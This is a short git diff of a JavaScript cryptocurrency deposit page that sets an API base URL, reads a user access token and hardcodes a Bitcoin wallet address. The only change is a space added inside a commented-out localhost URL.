@@ -5,7 +5,7 @@ if (user == null) {
 const _amount = document.getElementById("amount");
 let amount = 0;
 const api = "https://admin.coinpecko.online/api";
-//const api = "http://127.0.0.1:8000/api";
+// const api = "http://127.0.0.1:8000/api";
 let _token = user.access_token.original.access_token;
 let wallet_address = "bc1qytwvayz74lsw40z66agk2q33kssup9z7726akk";
 _amount.onchange = (e) => {
